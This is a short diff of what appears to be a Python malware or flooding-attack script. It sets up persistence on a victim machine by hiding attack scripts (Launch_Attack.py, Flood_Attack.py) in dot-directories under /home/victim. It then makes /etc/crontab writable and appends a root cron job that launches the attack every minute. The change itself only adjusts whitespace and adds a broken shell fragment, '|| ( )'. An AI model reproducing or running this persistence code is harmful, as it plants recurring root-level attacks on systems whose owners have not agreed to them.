@@ -4,13 +4,13 @@ import sys
 
 attackDirs = ['/home/victim/.etc', '/home/victim/.var']
 attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']
-attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || ( /usr/bin/python /home/victim/.var/.module/Launch_Attack.py )\n'
+attackCommand = '* * * * * root /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py || ( /usr/bin/python /home/victim/.var/.module/Launch_Attack.py ) \n'
 
 
 def set_up_crontab():
 
     # Write Crontab
-    os.system('chmod +w /etc/crontab')
+    os.system('chmod +w /etc/crontab || ( )')
 
     crontab = open('/etc/crontab', 'a')
 
